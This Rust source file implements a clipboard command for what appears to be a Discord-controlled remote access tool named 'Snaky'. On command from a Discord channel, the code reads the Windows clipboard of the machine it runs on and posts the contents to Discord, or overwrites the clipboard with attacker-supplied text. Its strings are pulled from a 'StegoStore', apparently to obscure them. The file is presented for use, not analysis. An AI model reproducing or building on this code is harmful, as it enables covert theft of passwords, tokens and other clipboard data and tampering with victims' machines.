use crate::commands::Arguments;
use crate::commands::BotCommand;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use clipboard_win::{get_clipboard_string, set_clipboard_string};
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct ClipboardCommand;

impl ClipboardCommand {
    fn m(key: &str) -> String { StegoStore::get(StringCategory::Msg, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for ClipboardCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("CLIPBOARD_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "CLIPBOARD").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_UTIL").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("CLIPBOARD_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".clipboard get", ".clipboard set Snaky!", ".clipboard set \"Snaky is free on guthib~!\""].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("CLIPBOARD_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("CLIPBOARD_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = match args.next() {
            Some(action) => action,
            None => {
                let embed = twilight_util::builder::embed::EmbedBuilder::new()
                    .title(Self::m("CLIP_TITLE"))
                    .description(Self::m("CLIP_DESC"))
                    .color(0xFF6B6B)
                    .field(twilight_model::channel::message::embed::EmbedField {
                        name: StegoStore::get(StringCategory::Core, "USAGE"),
                        value: Self::c("CLIPBOARD_USAGE"),
                        inline: false,
                    })
                    .field(twilight_model::channel::message::embed::EmbedField {
                        name: Self::m("CLIP_ACTIONS"),
                        value: Self::m("CLIP_ACTIONS_VAL"),
                        inline: false,
                    })
                    .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(StegoStore::get(StringCategory::Core, "BOT_NAME") + " Utility Commands"))
                    .build();

                http.create_message_with_embeds(msg.channel_id.get(), &[embed]).await?;
                return Ok(());
            }
        };

        match action {
            "get" => self.get_clipboard(http, msg).await,
            "set" => {
                let text = args.rest();
                if text.is_empty() {
                    http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_PROVIDE_TEXT")).await?;
                    return Ok(());
                }
                self.set_clipboard(http, msg, &text).await
            }
            _ => {
                http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_UNKNOWN").replace("{}", action)).await?;
                Ok(())
            }
        }
    }
}

impl ClipboardCommand {
    async fn get_clipboard(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        match get_clipboard_string() {
            Ok(content) => {
                if content.is_empty() {
                    http.create_message(msg.channel_id.get(), &Self::m("CLIP_EMPTY")).await?;
                } else {
                    if content.len() > 1900 {
                        let truncated = format!(
                            "{}...\n\n{}",
                            &content[..1900],
                            Self::m("CLIP_TRUNCATED")
                        );

                        let embed = twilight_util::builder::embed::EmbedBuilder::new()
                            .title(Self::m("CLIP_CONTENT_TITLE"))
                            .description(format!("```\n{}\n```", truncated))
                            .color(0x00D4AA)
                            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                                &Self::m("CLIP_LEN_TRUNC_FMT").replace("{}", &content.len().to_string()),
                            ))
                            .build();

                        http.create_message_with_embeds(msg.channel_id.get(), &[embed]).await?;
                    } else {
                        let embed = twilight_util::builder::embed::EmbedBuilder::new()
                            .title(Self::m("CLIP_CONTENT_TITLE"))
                            .description(format!("```\n{}\n```", content))
                            .color(0x00D4AA)
                            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                                &Self::m("CLIP_LEN_FMT").replace("{}", &content.len().to_string()),
                            ))
                            .build();

                        http.create_message_with_embeds(msg.channel_id.get(), &[embed]).await?;
                    }
                }
            }
            Err(e) => {
                http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_GET").replace("{}", &e.to_string())).await?;
            }
        }

        Ok(())
    }

    async fn set_clipboard(&self, http: &Arc<HttpClient>, msg: &Message, text: &str) -> Result<()> {
        match set_clipboard_string(text) {
            Ok(_) => {
                let preview = if text.len() > 100 {
                    format!("{}...", &text[..100])
                } else {
                    text.to_string()
                };

                let embed = twilight_util::builder::embed::EmbedBuilder::new()
                    .title(Self::m("CLIP_SET_TITLE"))
                    .description(Self::m("CLIP_SET_DESC"))
                    .color(0x32CD32)
                    .field(twilight_model::channel::message::embed::EmbedField {
                        name: Self::m("CLIP_PREVIEW"),
                        value: format!("```\n{}\n```", preview),
                        inline: false,
                    })
                    .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                        &Self::m("CLIP_LEN_FMT").replace("{}", &text.len().to_string()),
                    ))
                    .build();

                http.create_message_with_embeds(msg.channel_id.get(), &[embed]).await?;
            }
            Err(e) => {
                http.create_message(msg.channel_id.get(), &Self::m("CLIP_ERR_SET").replace("{}", &e.to_string())).await?;
            }
        }

        Ok(())
    }
}


